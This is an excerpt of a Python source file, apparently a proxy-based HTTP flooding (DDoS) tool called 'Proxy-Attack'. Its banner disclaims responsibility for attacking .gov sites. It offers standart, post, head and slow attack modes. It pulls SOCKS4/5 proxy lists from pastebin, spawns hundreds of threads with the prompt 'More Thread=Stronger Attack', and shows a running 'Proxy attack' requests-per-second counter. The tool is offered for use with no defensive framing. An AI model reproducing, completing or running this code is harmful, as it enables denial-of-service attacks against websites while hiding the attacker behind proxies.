...
print('''            
                     ┌─────────────────────────────────────────────┐
                     │   Tos: Not Responsible For Attacking .gov   │
                     ├─────────────────────────────────────────────┤
                     │                 New stuff:                  │
                     │          [+] Optimization                   │
                     │          [+] Changed Output                 │
                     │          [+] Added Url Parser               │
                     ├─────────────────────────────────────────────┤
                     │ Link:https://github.com/okay13/Proxy-Attack │
                     └─────────────────────────────────────────────┘''')
time.sleep(1)
print(''' 
                     ┌─────────────────────────────────────────────┐
...
def build_threads(mode, thread_num, event, socks_type, ind_rlock):
    if mode == "post":
        ...
        for _ in range(thread_num):
            th = threading.Thread(target=standart, args=(event, socks_type, ind_rlock,))
            th.setDaemon(True)
            th.start()
    elif mode == "head":
        for _ in range(thread_num):
...
def CheckerOption():
    global proxies
    N = str(input("> Do you need to get socks list?(yes/n,default=y):"))
    if N == 'yes' or N == "":
...
def OutputToScreen(ind_rlock):
    ...
    while 1:
        ...
        for k, v in ind_dict.items():
            ...
            ind_dict[k] = 0
        ind_rlock.release()
        print("{:^70}".format(" [" + sp_char[i] + "] Proxy attack | Total Rps:" + str(total)))
        i += 1
        time.sleep(1)
        print("\n" * 100)


def standart(event, socks_type, ind_rlock):
    global ind_dict
...
def downloadsocks(choice):
    if choice == "4":
        ...
        try:
            ...
            pass
        try:
            r = requests.get("https://pastebin.com/raw/tknzrWVK", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
    ...
    if choice == "5":
        ...
        try:
            ...
            pass
        try:
            r = requests.get("https://pastebin.com/raw/ehUgJ0gB", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
...
def main():
    ...
    global brute
    global url
    print("> Mode: [standart/post/head/slow/check]")
    mode = InputOption("> Choose Your Mode (best=standart) :", ["standart", "post", "head", "slow", "check"], "standart")
    ...
    choice = InputOption("> Choose your socks mode(4/5, Better One=5):", ["4", "5"], "5")
    if choice == "4":
        socks_type = 4
    else:
        socks_type = 5
    ...
    if mode == "slow":
        ...
        thread_num = str(input("> Threads(default=400 More Thread=Stronger Attack):"))
    if thread_num == "":
        thread_num = int(400)
    else:
        try:
